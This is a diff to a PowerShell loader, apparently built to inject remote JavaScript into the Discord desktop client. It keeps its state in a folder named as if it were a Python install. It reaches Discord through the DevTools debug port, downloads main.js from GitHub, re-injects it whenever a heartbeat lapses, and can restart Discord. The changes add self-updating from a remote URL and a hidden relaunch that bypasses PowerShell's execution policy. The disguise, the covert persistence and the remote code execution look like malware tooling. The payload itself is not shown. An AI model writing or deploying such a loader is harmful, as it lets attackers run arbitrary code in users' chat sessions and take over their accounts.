@@ -9,8 +9,13 @@ param(
     [switch]$NoRestart,
     [switch]$NoLaunch,
     [switch]$NoDownload,
+    [switch]$NoSelfUpdate,
+    [switch]$NoMutex,
+    [string]$StateDir,
     [switch]$Quiet
 )
+
+$LoaderVersion = '2.1.0'
 
 $ErrorActionPreference = 'Stop'
 
@@ -20,7 +25,7 @@ if (-not $Root) {
 }
 
 # ---------------------------------------------------------------- state / log
-$StateDir = Join-Path $env:LOCALAPPDATA 'Python316'
+$StateDir = if ($StateDir) { $StateDir } else { Join-Path $env:LOCALAPPDATA 'Python316' }
 if (-not (Test-Path $StateDir)) { New-Item -ItemType Directory -Path $StateDir -Force | Out-Null }
 $LogFile      = Join-Path $StateDir 'injector.log'
 $RestartStamp = Join-Path $StateDir 'last_restart.txt'
@@ -49,10 +54,11 @@ if (-not $Port) { $Port = 9222 }
 if (-not $MainUrl -and $cfg.githubRaw) { $MainUrl = [string]$cfg.githubRaw }
 if (-not $RepoBase -and $cfg.repoBase) { $RepoBase = [string]$cfg.repoBase }
 if (-not $MainPath) { $MainPath = Join-Path $Root 'main.js' }
-$AutoLaunch      = if ($null -ne $cfg.autoLaunch)      { [bool]$cfg.autoLaunch }      else { $true }
-$RestartExisting = if ($null -ne $cfg.restartExisting) { [bool]$cfg.restartExisting } else { $true }
-$PollSeconds     = if ($cfg.pollSeconds)               { [int]$cfg.pollSeconds }      else { 6 }
-$UpdateCheckSeconds = if ($cfg.updateCheckSeconds)     { [int]$cfg.updateCheckSeconds } else { 600 }
+$AutoLaunch         = if ($null -ne $cfg.autoLaunch)      { [bool]$cfg.autoLaunch }      else { $true }
+$RestartExisting    = if ($null -ne $cfg.restartExisting) { [bool]$cfg.restartExisting } else { $true }
+$PollSeconds        = if ($cfg.pollSeconds)               { [int]$cfg.pollSeconds }      else { 6 }
+$UpdateCheckSeconds = if ($cfg.updateCheckSeconds)        { [int]$cfg.updateCheckSeconds } else { 600 }
+$HeartbeatMaxMs     = 30000
 
 function Get-RepoBase {
     if ($RepoBase) { return $RepoBase.TrimEnd('/') }
@@ -62,12 +68,16 @@ function Get-RepoBase {
 $RepoBase = Get-RepoBase
 
 # ---------------------------------------------------------------- single instance
-$mutex = New-Object System.Threading.Mutex($false, 'Local\Python316Injector')
-$hasMutex = $false
-try { $hasMutex = $mutex.WaitOne(0) } catch { $hasMutex = $true }
-if (-not $hasMutex) {
-    Write-Log 'Another injector is already running. Exit.' 'WARN'
-    exit 0
+$mutex = $null
+$hasMutex = $true
+if (-not $NoMutex) {
+    $mutex = New-Object System.Threading.Mutex($false, 'Local\Python316Injector')
+    $hasMutex = $false
+    try { $hasMutex = $mutex.WaitOne(0) } catch { $hasMutex = $true }
+    if (-not $hasMutex) {
+        Write-Log 'Another injector is already running. Exit.' 'WARN'
+        exit 0
+    }
 }
 
 # ---------------------------------------------------------------- helpers
@@ -169,17 +179,13 @@ function Get-EvalValue {
     } catch { return $null }
 }
 
-function Get-CurrentVersion {
+function Get-ClientState {
     try {
-        $r = Invoke-CdpEval -Code "try{(window.__python316 && window.__python316.__version) || null}catch(e){null}"
-        return Get-EvalValue -Text $r
+        $r = Invoke-CdpEval -Code "try{JSON.stringify({v:(window.__python316&&window.__python316.__version)||null,a:(window.__python316&&window.__python316.__alive)||0,h:!!document.getElementById('py316-host')})}catch(e){null}"
+        $s = Get-EvalValue -Text $r
+        if (-not $s) { return $null }
+        return ($s | ConvertFrom-Json)
     } catch { return $null }
-}
-
-function Test-VersionMatch {
-    param($Current, [string]$Desired)
-    if (-not $Desired) { return [bool]$Current }
-    return ([string]$Current -eq [string]$Desired)
 }
 
 function Test-PayloadCode {
@@ -188,15 +194,6 @@ function Test-PayloadCode {
     if ($Code -notmatch '__python316') { return $false }
     if ($Code -notmatch 'Python3\.16') { return $false }
     return $true
-}
-
-function Save-PayloadCache {
-    param([string]$Code)
-    try {
-        $tmp = "$MainPath.tmp"
-        Set-Content -LiteralPath $tmp -Value $Code -Encoding UTF8
-        Move-Item -LiteralPath $tmp -Destination $MainPath -Force
-    } catch { Write-Log "Cache write failed: $($_.Exception.Message)" 'WARN' }
 }
 
 function Get-GitHubCoord {
@@ -235,7 +232,16 @@ function Get-RemoteVersionJson {
             $txt = ([string]$txt).TrimStart([char]0xFEFF)
             $j = $txt | ConvertFrom-Json
             if ($j.version) {
-                return [pscustomobject]@{ Version = [string]$j.version; Url = [string]$j.url; Sha = $sha; Coord = $coord }
+                return [pscustomobject]@{
+                    Version      = [string]$j.version
+                    Url          = [string]$j.url
+                    Sha256       = [string]$j.sha256
+                    LoaderVersion= [string]$j.loaderVersion
+                    LoaderUrl    = [string]$j.loaderUrl
+                    LoaderSha256 = [string]$j.loaderSha256
+                    Sha          = $sha
+                    Coord        = $coord
+                }
             }
         } catch {}
     }
@@ -243,27 +249,33 @@ function Get-RemoteVersionJson {
 }
 
 function Get-RemotePayload {
+    param($Meta)
     if ($NoDownload) { return $null }
-    $meta = Get-RemoteVersionJson
-    $version = if ($meta) { $meta.Version } else { $null }
-    $coord = if ($meta) { $meta.Coord } else { Get-GitHubCoord }
-    $sha = if ($meta) { $meta.Sha } else { $null }
+    if (-not $Meta) { $Meta = Get-RemoteVersionJson }
+    $version = if ($Meta) { $Meta.Version } else { $null }
+    $coord = if ($Meta) { $Meta.Coord } else { Get-GitHubCoord }
+    $sha = if ($Meta) { $Meta.Sha } else { $null }
 
     $url = $null
     if ($coord -and $sha) {
         $url = 'https://raw.githubusercontent.com/{0}/{1}/{2}/main.js' -f $coord.Owner, $coord.Repo, $sha
-    } elseif ($meta -and $meta.Url) {
-        $url = $meta.Url
+    } elseif ($Meta -and $Meta.Url) {
+        $url = $Meta.Url
     } elseif ($MainUrl) {
         $url = $MainUrl
     }
     if (-not $url) { Write-Log 'No payload URL resolved' 'WARN'; return $null }
 
+    $tmp = Join-Path $env:TEMP ('py316-payload-{0}.js' -f [guid]::NewGuid().ToString('N'))
     try {
         $sep = if ($url -match '\?') { '&' } else { '?' }
         $fUrl = '{0}{1}t={2}' -f $url, $sep, [DateTime]::UtcNow.Ticks
-        $code = (Invoke-WebRequest -Uri $fUrl -UseBasicParsing -TimeoutSec 20).Content
-        if ($code -is [byte[]]) { $code = [System.Text.Encoding]::UTF8.GetString($code) }
+        Invoke-WebRequest -Uri $fUrl -UseBasicParsing -TimeoutSec 25 -OutFile $tmp
+        if ($Meta -and $Meta.Sha256) {
+            $h = (Get-FileHash -LiteralPath $tmp -Algorithm SHA256).Hash.ToLower()
+            if ($h -ne ([string]$Meta.Sha256).ToLower()) { throw 'payload sha256 mismatch' }
+        }
+        $code = [System.IO.File]::ReadAllText($tmp, [System.Text.Encoding]::UTF8)
         if (-not (Test-PayloadCode -Code $code)) { throw 'payload failed validation' }
         if ($version) {
             if ($code -match '__version\s*=\s*[''"]([^''"]+)[''"]') {
@@ -276,11 +288,13 @@ function Get-RemotePayload {
         } else {
             if ($code -match '__version\s*=\s*[''"]([^''"]+)[''"]') { $version = $Matches[1] }
         }
-        Save-PayloadCache -Code $code
+        Move-Item -LiteralPath $tmp -Destination $MainPath -Force
         return [pscustomobject]@{ Code = $code; Version = $version; Url = $url }
     } catch {
         Write-Log "Download failed: $($_.Exception.Message)" 'WARN'
         return $null
+    } finally {
+        if (Test-Path $tmp) { Remove-Item -LiteralPath $tmp -Force -ErrorAction SilentlyContinue }
     }
 }
 
@@ -294,7 +308,8 @@ function Get-LocalPayload {
 }
 
 function Get-Payload {
-    $p = Get-RemotePayload
+    param($Meta)
+    $p = Get-RemotePayload -Meta $Meta
     if ($p) { return $p }
     $p = Get-LocalPayload
     if ($p) {
@@ -302,6 +317,32 @@ function Get-Payload {
         return $p
     }
     throw 'No payload available (download failed and no valid local main.js)'
+}
+
+function Update-LoaderIfNeeded {
+    param($Meta)
+    if ($NoSelfUpdate -or -not $Meta) { return }
+    $lv = [string]$Meta.LoaderVersion
+    if (-not $lv -or $lv -eq $LoaderVersion) { return }
+    if (-not $Meta.LoaderUrl) { Write-Log 'loader update available but no loaderUrl' 'WARN'; return }
+    Write-Log ("Loader update {0} -> {1}" -f $LoaderVersion, $lv)
+    $tmp = Join-Path $env:TEMP ('py316-loader-{0}.ps1' -f [guid]::NewGuid().ToString('N'))
+    try {
+        $sep = if ($Meta.LoaderUrl -match '\?') { '&' } else { '?' }
+        Invoke-WebRequest -Uri ('{0}{1}t={2}' -f $Meta.LoaderUrl, $sep, [DateTime]::UtcNow.Ticks) -UseBasicParsing -TimeoutSec 25 -OutFile $tmp
+        if ($Meta.LoaderSha256) {
+            $h = (Get-FileHash -LiteralPath $tmp -Algorithm SHA256).Hash.ToLower()
+            if ($h -ne ([string]$Meta.LoaderSha256).ToLower()) { throw 'loader sha256 mismatch' }
+        }
+        $null = [scriptblock]::Create([System.IO.File]::ReadAllText($tmp))
+        Copy-Item -LiteralPath $tmp -Destination (Join-Path $Root 'injector.ps1') -Force
+        $script:PendingReload = $true
+        Write-Log 'Loader updated; scheduling reload' 'OK'
+    } catch {
+        Write-Log "Loader update failed: $($_.Exception.Message)" 'WARN'
+    } finally {
+        if (Test-Path $tmp) { Remove-Item -LiteralPath $tmp -Force -ErrorAction SilentlyContinue }
+    }
 }
 
 function Restart-Discord {
@@ -329,6 +370,7 @@ $script:FailBackoff = 0
 $script:LastOkVersion = $null
 $script:CachedPayload = $null
 $script:LastCheck = 0
+$script:PendingReload = $false
 
 # ---------------------------------------------------------------- one pass
 function Invoke-Pass {
@@ -363,17 +405,34 @@ function Invoke-Pass {
 
     try {
         $epoch = [DateTimeOffset]::UtcNow.ToUnixTimeSeconds()
-        if ((-not $script:CachedPayload) -or (($epoch - $script:LastCheck) -ge $UpdateCheckSeconds)) {
-            $script:CachedPayload = Get-Payload
+        $needNet = (-not $script:CachedPayload) -or (($epoch - $script:LastCheck) -ge $UpdateCheckSeconds)
+        $meta = $null
+        if ($needNet) {
+            $meta = Get-RemoteVersionJson
+            Update-LoaderIfNeeded -Meta $meta
+            $script:CachedPayload = Get-Payload -Meta $meta
             $script:LastCheck = $epoch
         }
         $payload = $script:CachedPayload
         if (-not $payload) { throw 'No payload available' }
-        $current = Get-CurrentVersion
 
-        if (Test-VersionMatch -Current $current -Desired $payload.Version) {
-            $v = [string]$current
-            if ($script:LastOkVersion -ne $v) { Write-Log ("Up to date (v{0})" -f $v) 'DEBUG'; $script:LastOkVersion = $v }
+        $state = Get-ClientState
+        $current = if ($state) { [string]$state.v } else { $null }
+
+        if ($payload.Version) {
+            if ($current -eq [string]$payload.Version) {
+                $alive = $false
+                if ($state -and $state.a) {
+                    try { $alive = (([double]$epoch * 1000) - [double]$state.a) -lt $HeartbeatMaxMs } catch { $alive = $false }
+                }
+                if ($alive -and $state.h) {
+                    if ($script:LastOkVersion -ne $current) { Write-Log ("Up to date (v{0})" -f $current) 'DEBUG'; $script:LastOkVersion = $current }
+                    $script:FailBackoff = 0
+                    return
+                }
+                Write-Log 'Client heartbeat stale/missing, re-injecting' 'WARN'
+            }
+        } elseif ($current) {
             $script:FailBackoff = 0
             return
         }
@@ -385,17 +444,20 @@ function Invoke-Pass {
 
         [void](Invoke-CdpEval -Code $payload.Code)
         Start-Sleep -Milliseconds 250
-        $after = Get-CurrentVersion
+        $after = Get-ClientState
 
-        if ($after) {
+        if ($after -and $after.v) {
             $script:FailBackoff = 0
-            $script:LastOkVersion = [string]$after
-            Save-InjectState -Version ([string]$after)
-            if ($payload.Version -and ([string]$after -ne [string]$payload.Version)) {
-                Write-Log ("Injected but version mismatch (current={0} payload={1})" -f $after, $payload.Version) 'WARN'
+            $script:LastOkVersion = [string]$after.v
+            Save-InjectState -Version ([string]$after.v)
+            if ($payload.Version -and ([string]$after.v -ne [string]$payload.Version)) {
+                Write-Log ("Injected but version mismatch (current={0} payload={1})" -f $after.v, $payload.Version) 'WARN'
             } else {
-                Write-Log ("main.js injected successfully (v{0})" -f $after) 'OK'
+                Write-Log ("main.js injected successfully (v{0})" -f $after.v) 'OK'
             }
+        } elseif ($after -and $after.h) {
+            $script:FailBackoff = 0
+            Write-Log 'main.js injected (legacy payload, no version)' 'OK'
         } else {
             throw 'marker missing after evaluate (page may not be ready)'
         }
@@ -406,7 +468,7 @@ function Invoke-Pass {
 }
 
 # ---------------------------------------------------------------- run
-Write-Log ("Python316 injector v2 starting (port={0} root={1} once={2} base={3})" -f $Port, $Root, [bool]$Once, $RepoBase)
+Write-Log ("Python316 injector v{0} starting (port={1} root={2} once={3} base={4})" -f $LoaderVersion, $Port, $Root, [bool]$Once, $RepoBase)
 
 try {
     if ($Once) {
@@ -414,11 +476,19 @@ try {
     } else {
         while ($true) {
             try { Invoke-Pass } catch { Write-Log "Pass error: $($_.Exception.Message)" 'ERR' }
+            if ($script:PendingReload) {
+                Write-Log 'Reloading watcher with the new loader'
+                try { if ($mutex -and $hasMutex) { $mutex.ReleaseMutex(); $hasMutex = $false } } catch {}
+                $null = Start-Process -FilePath 'powershell.exe' -ArgumentList @(
+                    '-NoProfile','-WindowStyle','Hidden','-ExecutionPolicy','Bypass','-File', ('"{0}"' -f (Join-Path $Root 'injector.ps1'))
+                ) -WindowStyle Hidden -PassThru
+                break
+            }
             $sleep = [Math]::Max($PollSeconds, $script:FailBackoff)
             Start-Sleep -Seconds $sleep
         }
     }
 } finally {
-    try { if ($hasMutex) { $mutex.ReleaseMutex() } } catch {}
-    try { $mutex.Dispose() } catch {}
+    try { if ($mutex -and $hasMutex) { $mutex.ReleaseMutex() } } catch {}
+    try { if ($mutex) { $mutex.Dispose() } } catch {}
 }
